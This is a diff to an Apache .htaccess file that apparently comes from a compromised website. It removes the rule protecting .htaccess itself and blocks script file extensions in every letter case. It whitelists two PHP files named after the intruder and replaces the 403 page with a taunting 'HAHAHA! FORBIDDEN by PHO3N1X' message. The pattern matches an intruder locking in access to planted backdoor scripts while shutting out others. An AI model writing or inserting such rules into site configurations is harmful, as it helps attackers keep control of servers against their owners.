@@ -6,10 +6,6 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<Files *.S*>
-    Order Deny,Allow
-    Deny from all
-</Files>
 <Files *.pH*>
     Order Deny,Allow
     Deny from all
@@ -18,13 +14,53 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<Files *.s*>
+<Files *.sh*>
     Order Deny,Allow
     Deny from all
 </Files>
-
-<Files ".htaccess">
-    Require all denied
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
 </Files>
-
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(kim-suho-MAR.php|kimsuho.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
+Options -Indexes
 ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/rKUibSGek-gAAAAd/mau-ngapain-om-noobpublic.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by PHO3N1X</h2>
